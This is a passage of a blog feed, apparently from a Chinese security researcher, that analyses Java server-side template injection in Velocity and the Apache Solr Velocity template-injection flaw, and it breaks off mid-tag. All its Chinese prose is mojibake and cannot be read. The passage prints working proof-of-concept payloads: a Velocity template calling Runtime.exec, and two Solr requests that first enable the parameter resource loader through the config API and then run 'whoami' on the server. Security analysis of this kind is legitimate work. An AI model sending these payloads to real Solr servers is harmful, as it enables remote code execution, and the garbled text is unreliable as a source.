    <content type="html"><![CDATA[<p>&emsp;&emsp; è§£å†³Skipped breakpoint at %code reference% because it happened inside debugger evaluationçš„é€šç”¨æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200505201706460.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200505201642976.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol><li>å…ˆå°è¯•å»æ‰å‹¾é€‰ <code>Enable &#39;tostring0&#39; object view</code><blockquote><p>å› ä¸ºideaçš„debuggeræ˜¯é»˜è®¤ä¼šåœ¨å†…éƒ¨å°†æ–¹æ³•æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶åå›æ˜¾æç¤ºæ•°æ®ï¼Œæœ¬æ„æ˜¯å¾ˆå¥½ï¼Œä½†æœ‰æ—¶å€™ä¼šå¹²æ‰°å½±å“ç»“æœã€‚</p></blockquote></li></ol><p><img src="https://img-blog.csdnimg.cn/20200505201349162.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol start="3"><li>å¦‚æœè¿˜æ˜¯ä¸è¡Œå°±å†å»æ‰å‹¾é€‰<code>Enable alternative view for Collections classes</code>ä¸€å®šæ˜¯å¯ä»¥çš„ã€‚<blockquote><p>ideaé»˜è®¤åœ¨ç”¨æˆ·è°ƒè¯•ä¹‹å‰å…ˆæ‰§è¡Œ<code>toString</code>æ–¹æ³•ï¼Œç„¶åå›æ˜¾æ•°æ®ï¼Œä¹Ÿå°±æ˜¯<code>â€œé¢„çŸ¥â€</code>åŠŸèƒ½ã€‚ä½†æœ‰æ—¶å€™ä¼šå½±å“åˆ¤æ–­ï¼Œä½†å¯ä»¥è®¾ç½®é‚£äº›ç±»ä¸­<code>toString</code>æ–¹æ³•æ˜¯æ˜¯å¯ä»¥åš<code>â€œé¢„çŸ¥â€</code>ã€‚</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp; è§£å†³Skipped breakpoint at %code reference% because it happened inside debugger evaluationçš„é€šç”¨æ–¹æ³•ã€‚&lt;br&gt;&lt;img src=&quot;https://img-blog.
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java debugger" scheme="https://summersec.github.io/tags/Java-debugger/"/>
    
  </entry>
  
  <entry>
    <title>ç™½å¤´æ”æ›´çŸ­ï¼ŒSSTIæƒ¹äººå¿ƒï¼</title>
    <link href="https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/"/>
    <id>https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/</id>
    <published>2020-03-24T07:20:16.000Z</published>
    <updated>2020-05-06T07:19:31.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><strong>ä¸ºä»€ä¹ˆè¯´Javaå®¡è®¡å—åœ¨SSTIå‘¢ï¼Ÿ</strong></p><ol><li>ç°è¡ŒSSTI(Server-Side Template Injection ) èµ„æ–™ä¸å°‘ï¼Œä½†ä¸Javaï¼Œä»¥è‘—åçš„å…ˆçŸ¥ç¤¾åŒºä¸ºä¾‹ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œå…³äºSSTIæ–‡ç« ä¹Ÿä¸è¿‡å‡ ç¯‡è€Œå·²ï¼Œä½†ä¸Javaç›¸å…³çš„ä¸€ç¯‡éƒ½æ²¡æœ‰ã€‚<br><img src="https://img-blog.csdnimg.cn/2020031517280148.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>æœç´¢CVEæ¼æ´æœ‰å…³äºSSTIçš„æ¼æ´ç¼–å·ä¹Ÿä¸è¿‡åªæœ‰å‡ ä¸ªè€Œå·²ã€‚<br><img src="https://img-blog.csdnimg.cn/20200317133833592.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>å¦‚æœä½ æ˜¯ä¸€åè€å¸æœºï¼Œå·²ç»æŒ–è¿‡sstiæ¼æ´ï¼Œé‚£ä½ æ˜¯å¦çŸ¥é“payloadæ„é€ åŸç†å‘¢ï¼Ÿæœ¬æ–‡ä¸ºä½ è§£æƒ‘ï¼è€å¸æœºå¯ä»¥ç›´æ¥è·³è½¬åˆ°åè®°çœ‹æœ¬æ–‡ï¼Œæˆ–è€…ä½ åªæ˜¯æƒ³çœ‹payloadæ„é€ åŸç†äº¦å¦‚æ­¤ï¼Œæœ¬æ–‡ç¯‡å¹…è¾ƒé•¿ï¼Œå»ºè®®å…ˆæ”¶è—ã€‚</li></ol><hr><h1 id="SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"><a href="#SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTI æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"></a>SSTI æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</h1><p>&emsp;&emsp; sstiæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œsstiä¸»è¦ä¸ºpythonçš„ä¸€äº›æ¡†æ¶ jinja2ã€ mako tornado ã€djangoï¼ŒPHPæ¡†æ¶smarty twigï¼Œjavaæ¡†æ¶FreeMarkerã€jadeã€ velocityç­‰ç­‰ä½¿ç”¨äº†æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ï¼Œä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç ä¸è§„èŒƒä¸ä¸¥è°¨é€ æˆäº†æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œé€ æˆæ¨¡æ¿å¯æ§ã€‚</p><p><img src="https://img-blog.csdnimg.cn/202003161429497.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¼æ´æºç </span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span></span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="comment">// ä½¿ç”¨Velocity</span></span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>POC</strong><br><code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p><hr><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a><strong>æ¼æ´åˆ†æ</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Velocity.evaluateå‡½æ•°æºç </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>è®¾ç½®æ–­ç‚¹å¼€å§‹è°ƒè¯•</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316151247751.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>è¿›å…¥Velocity.evaluateæ–¹æ³•æŸ¥çœ‹æ–¹æ³•è¯¦æƒ…</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200316151614641.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>ç»§ç»­è·Ÿè¿›æŸ¥çœ‹ï¼Œè¿™ä¸ªå°±æ˜¯Javaæœ€å¸¸è§çš„getæ–¹æ³•(åˆå§‹åŒ–)ã€‚ä¹Ÿæ˜¯Javaçš„ç‰¹æ€§ä¹‹ä¸€å°è£…æ€§ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316152752486.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>RuntimeInstanceç±»ä¸­å°è£…äº†evaluateæ–¹æ³•ï¼Œinstringè¢«å¼ºåˆ¶è½¬åŒ–(Reader)ç±»å‹ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316153220725.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>è¿›å…¥StringReaderçœ‹çœ‹</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316154323392.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>åœ¨è¿›å…¥evaluateæŸ¥çœ‹æ–¹æ³•å…·ä½“å®ç°è¿‡ç¨‹</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer writer, String logTag, Reader reader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logTag == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            SimpleNode nodeTree = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ¥åˆ°è¿™é‡Œè¿›è¡Œè§£æ</span></span><br><span class="line">                nodeTree = <span class="keyword">this</span>.parse(reader, logTag);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var7, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateInitException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var8, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// åˆ¤æ–­ï¼Œç„¶åè¿›å…¥this.renderæ–¹æ³•</span></span><br><span class="line">            <span class="keyword">return</span> nodeTree == <span class="keyword">null</span> ? <span class="keyword">false</span> : <span class="keyword">this</span>.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>ç»§ç»­è·Ÿè¿›renderæ–¹æ³•</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161419209.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>renderæ–¹æ³•é‡Œé¢è¿˜æœ‰ä¸€ä¸ªrenderæ–¹æ³•ï¼ŒçœŸçš„æ˜¯â„¢çƒ¦ã€‚ä¸è¿‡è¿™ä¸ªæ˜¯simpleNodelç±»çš„renderæ–¹æ³•ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161613552.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li><strong>é«˜æ½®æ¿€æƒ…éƒ¨åˆ†</strong>ï¼Œç”±äºå‰é¢ä¸¤ä¸ªæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œè®©æˆ‘ä»¬ç›´æ¥è·³åˆ°ç¬¬ä¸‰ä¸ªçœ‹ï¼Œè¿›å…¥renderæ–¹æ³•ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162015493.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸èƒ½å‘ç°æœ‰ä¸€ä¸ªexecuteæ–¹æ³•ï¼Œè¿™å°±æ˜¯ç½ªé­ç¥¸é¦–ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162552984.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>è®©æˆ‘ä»¬è¿›è¡Œè·Ÿè¿›æ–¹æ³•ï¼Œç”±äºæ˜¯é‡æ„çš„executeæ–¹æ³•ï¼Œè¿˜æ˜¯å¾—çœ‹æ¸…æ¥šç‚¹åŸç†ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æˆªå–çš„éƒ¨åˆ†å…³é”®æ€§æºä»£ç </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numChildren; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.strictRef &amp;&amp; result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            methodName = <span class="keyword">this</span>.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> VelocityException(<span class="string">"Attempted to access '"</span> + methodName + <span class="string">"' on a null value at "</span> + Log.formatFileString(<span class="keyword">this</span>.uberInfo.getTemplateName(), <span class="keyword">this</span>.jjtGetChild(i).getLine(), <span class="keyword">this</span>.jjtGetChild(i).getColumn()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        previousResult = result;</span><br><span class="line">                        result = <span class="keyword">this</span>.jjtGetChild(i).execute(result, context);</span><br><span class="line">                        <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.strictRef) &#123;</span><br><span class="line">                            failedChild = i;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>ä¸Šé¢çš„forå¾ªç¯æˆ‘å°±ä¸è¯´äº†å®ƒçš„ä½œç”¨äº†ï¼Œæˆ‘ä»¬ç„¦ç‚¹æ”¾åœ¨previousResult ï¼ˆä¹‹å‰çš„ç»“æœï¼‰å’Œresultä¸Šé¢ã€‚</p></li><li><p>previousResult = result;é¦–å…ˆè¿™è¡Œä»£ç ä½¿å…¶å®ƒä»¬ä¿æŒä¸€è‡´</p></li><li><p>å½“éå†çš„èŠ‚ç‚¹æ—¶å€™ï¼Œè¿™æ—¶å€™å°±ä¼šä¸€æ­¥æ­¥çš„ä¿å­˜æˆ‘ä»¬çš„payloadæœ€ç»ˆå¯¼è‡´RCE<br><img src="https://img-blog.csdnimg.cn/20200316155414726.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>å®Œæ•´çš„æ•ˆæœå±•ç¤º<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMTE0NTgwMS1mYjEyMzA5YjRjMDU5MmE2LmdpZg" alt></p></li><li><p>å®Œæ•´çš„è°ƒç”¨é“¾</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162402512.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ¡ˆä¾‹åˆ†æ-â€”-Apache-solr-Velocity-æ¨¡ç‰ˆæ³¨å…¥"><a href="#æ¡ˆä¾‹åˆ†æ-â€”-Apache-solr-Velocity-æ¨¡ç‰ˆæ³¨å…¥" class="headerlink" title="æ¡ˆä¾‹åˆ†æ â€” Apache solr Velocity æ¨¡ç‰ˆæ³¨å…¥"></a>æ¡ˆä¾‹åˆ†æ â€” Apache solr Velocity æ¨¡ç‰ˆæ³¨å…¥</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>&emsp;&emsp; è¿™ä¸ªæ¼æ´æ˜¯å»å¹´10æœˆåº•çˆ†å‡ºçš„æ¼æ´ï¼Œè¿™é‡Œåªåšå¿…è¦çš„ç®€å•å¤ç°ï¼Œç¬”è€…åœ¨è¿™ç¯‡æ–‡ç« é‡Œä¸»è¦æ˜¯åˆ†æï¼Œæ›´åŠ å®Œæ•´çš„<a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">æ¼æ´å¤ç°è¿‡ç¨‹</a>å‚è€ƒã€‚</p><ol><li>ç¬¬ä¸€æ­¥ä¿®æ”¹é…ç½®ï¼Œå¼€å¯Velocityæ¨¡ç‰ˆé‡Œ<code>VelocityResponseWriter</code>åˆå§‹åŒ–å‚æ•°çš„<code>params.resource.loader.enabled</code>é€‰é¡¹ï¼Œè¯¥é€‰é¡¹é»˜è®¤æ˜¯<code>false</code>ã€‚æŸ¥çœ‹<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">W3Cschool solrå®˜æ–¹æ–‡æ¡£</a>å¯çŸ¥ï¼Œsolræ˜¯é…ç½®apiå¯ä»¥è¿›è¡ŒæŸ¥çœ‹é…ç½®ã€ä¿®æ”¹é…ç½®çš„ã€‚</li></ol><p>è®¿é—®æŸ¥çœ‹<code>http://127.0.0.1:8983/solr/test/config</code>é…ç½®ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20200321162727737.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317150202155.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317151703268.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="æ¼æ´åˆ†æç¯å¢ƒæ­å»º"><a href="#æ¼æ´åˆ†æç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´åˆ†æç¯å¢ƒæ­å»º"></a>æ¼æ´åˆ†æç¯å¢ƒæ­å»º</h2><p>&emsp;&emsp; ç¬”è€…åœ¨æ­¤æ˜¯ä½¿ç”¨è¿œç¨‹ä»£ç è°ƒè¯•çš„æ–¹å¼ï¼Œåˆ†ææºç ã€‚<a href="https://archive.apache.org/dist/lucene/solr/8.2.0/" target="_blank" rel="noopener">æºç ä¸‹è½½åœ°å€</a>windowsç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸‹è½½è¿™ä¸¤ä¸ªï¼Œè¿™é‡Œç¬”è€…ä¸‹è½½ä¸‹è½½ç¬¬äºŒä¸ªã€‚ï¼ˆä¸‹è½½ç¬¬ä¸€ä¸ªéœ€è¦ç¼–è¯‘ï¼Œè¿‡ç¨‹è‡ªè¡Œç™¾åº¦ï¼‰<br><img src="https://img-blog.csdnimg.cn/20200317160246408.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol><li><p>è§£å‹ï¼Œå°†æºç å¯¼å…¥ideaä¸­ï¼Œå¹¶é…ç½®ideaä¸­è¿œç¨‹ä»£ç è°ƒè¯•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200317160450347.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>åœ¨ç¬¬äºŒä¸ªä¸‹è½½å‹ç¼©åŒ…è·¯å¾„CMDç¯å¢ƒä¸‹ï¼ˆ~~\solr-8.2.0\bin\ï¼‰ï¼Œå¯åŠ¨å‘½ä»¤<code>solr start -p 8983 -f -a &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200317161340408.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç”¨ideaæ‰“å¼€é¡¹ç›®ï¼Œå¯¼å…¥jaræ–‡ä»¶è®¾ç½®ä¸ºlibraryã€‚ï¼ˆè¿˜æœ‰å‡ å¤„åœ¨solr-8.2.0\contrib\velocity\libã€solr-8.2.0\server\libâ€¦â€¦ï¼‰<br><img src="https://img-blog.csdnimg.cn/20200323143907966.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>æ‰“æ–­ç‚¹è°ƒè¯•ä»£ç ã€‚åˆ†æä¸€ä¸ªwebé¡¹ç›®é¦–å…ˆæˆ‘ä»¬å¾—çœ‹web.xmlæ–‡ä»¶<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml</code>ï¼Œçœ‹ç¬¬ä¸€å¥ï¼Œå‘ç°<code>åœ¨solrconfig.xmlä¸­æ³¨å†Œçš„ä»»ä½•è·¯å¾„ï¼ˆåç§°ï¼‰éƒ½å°†å‘é€åˆ°è¯¥è¿‡æ»¤å™¨</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/20200321153010735.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ol><ul><li>æ–­ç‚¹ä½ç½®ï¼Œä¸ºä»€ä¹ˆä¼šåœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼Œç¬”è€…ç¿»é˜…èµ„æ–™å¾—çŸ¥è¿™é‡Œæ˜¯æ ¸å¿ƒä½ç½®ã€‚å…·ä½“å‚è€ƒ<a href="https://my.oschina.net/haitaohu/blog/3078667" target="_blank" rel="noopener">solræºç é˜…è¯»</a>ã€‚<br><img src="https://img-blog.csdnimg.cn/20200321154555773.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><hr><h2 id="æ¼æ´æˆå› åˆ†æ-â€“-ä»£ç å±‚"><a href="#æ¼æ´æˆå› åˆ†æ-â€“-ä»£ç å±‚" class="headerlink" title="æ¼æ´æˆå› åˆ†æ â€“ ä»£ç å±‚"></a>æ¼æ´æˆå› åˆ†æ â€“ ä»£ç å±‚</h2><h3 id="POCç¬¬ä¸€éƒ¨åˆ†"><a href="#POCç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="POCç¬¬ä¸€éƒ¨åˆ†"></a>POCç¬¬ä¸€éƒ¨åˆ†</h3><p>&emsp;&emsp; ç¬¬ä¸€éƒ¨åˆ†åˆ†æè¯·æŸ¥çœ‹<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">Solré…ç½®APIï¼šConfig API</a>æ–‡æ¡£ï¼Œæ–‡æ¡£ä¸­è¯´æ˜çš„å¾ˆæ¸…æ¥šã€‚PSï¼šæ¼æ´å¤ç°çš„æ—¶å€™ä¹Ÿæœ‰è¯´æ˜ã€‚<br><img src="https://img-blog.csdnimg.cn/2020032319153017.png?" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h3 id="POCåéƒ¨åˆ†åˆ†æ"><a href="#POCåéƒ¨åˆ†åˆ†æ" class="headerlink" title="POCåéƒ¨åˆ†åˆ†æ"></a>POCåéƒ¨åˆ†åˆ†æ</h3><ol><li>ç¬”è€…è¿™é‡Œç›´æ¥è¯´å‡ ä¸ªå…³é”®çš„éƒ¨åˆ†ä»£ç <br>ç¬¬ä¸€æ­¥å…ˆå¤„ç†è¯·æ±‚<br><img src="https://img-blog.csdnimg.cn/20200324135210989.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><ol start="2"><li><code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class</code>è·³è½¬åˆ°<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class</code> å…ˆå¤„ç†å‚æ•°wtï¼Œè®¾ç½®ä¸ºvelocityã€‚<br><img src="https://img-blog.csdnimg.cn/20200324140636319.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>å†™å…¥å“åº”<br><img src="https://img-blog.csdnimg.cn/202003241354181.png" 